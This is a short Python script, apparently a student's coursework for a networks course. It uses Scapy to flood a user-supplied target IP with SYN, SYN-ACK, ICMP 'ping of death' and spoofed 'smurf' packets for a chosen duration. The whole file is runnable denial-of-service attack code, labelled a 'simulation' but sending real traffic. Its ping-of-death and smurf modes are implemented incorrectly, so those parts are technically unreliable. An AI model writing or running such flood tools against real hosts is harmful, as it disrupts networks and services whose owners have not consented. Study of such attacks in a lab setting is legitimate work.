'''

Submitted by: Fahad Waseem
Group: N/A
Major: Computer Networks & IOT
University: Cnam

'''

from scapy.all import *
import argparse, time

def ddos (target_ip, attack_type, time_duration) :
    target_port = 12345
    if attack_type == "syn_flood":
        endtime = time.time() + time_duration
        while time.time() < endtime:
            src_port = random.randint(1024, 65535)
            pkt = IP(dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
            send(pkt, verbose=0)
    if attack_type == "pod":
        endtime = time.time() + time_duration
        while time.time() < endtime:
            load = 6000
            pkt = IP(dst=target_ip) / ICMP() / Raw(load=load)
            send(pkt, verbose=0)
    if attack_type == "syn_ack":
        endtime = time.time() + time_duration
        while time.time() < endtime:
            src_port = random.randint(1024, 65535)
            pkt = IP(dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="SA")
            send(pkt, verbose=0)
    if attack_type == "smurf":
        endtime = time.time() + time_duration
        while time.time() < endtime:
            pkt = IP(src=target_ip, dst=target_ip) / ICMP()
            send(pkt, verbose=0)

#Taking input from the user for the target ip, attack type and duration
parser = argparse.ArgumentParser(description="DoS attack simulation")
parser.add_argument("target_ip")
parser.add_argument("attack_type", choices=["syn_flood", "pod", "syn_ack", "smurf"])
parser.add_argument("time_duration", type=int)
args = parser.parse_args()

target_ip = args.target_ip
attack_type = args.attack_type

#It's the time of when the attacks end
time_duration = args.time_duration

ddos(target_ip, attack_type, time_duration)
